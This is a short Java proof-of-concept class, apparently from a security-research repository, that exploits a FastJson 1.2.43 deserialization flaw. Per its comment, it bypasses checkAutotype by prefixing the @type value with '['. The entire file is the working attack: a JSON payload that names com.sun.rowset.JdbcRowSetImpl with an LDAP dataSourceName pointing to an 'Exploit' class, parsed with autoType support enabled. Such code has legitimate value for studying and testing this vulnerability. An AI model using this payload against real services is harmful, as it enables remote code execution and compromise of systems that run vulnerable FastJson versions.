package com.jemmy.serialize.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * FastJson 1.2.43
 * jdk8u181
 *
 * 通过加[来绕过checkAutotype
 *
 * @author zhujiang.cheng
 * @since 2020/6/4
 */
public class JdbcRowSetBracketAttack {

    public static void main(String[] args) {
        String payload = "{\"rand1\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true]}}";
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSONObject jsonObject = JSON.parseObject(payload);
        System.out.println(jsonObject);
    }

}
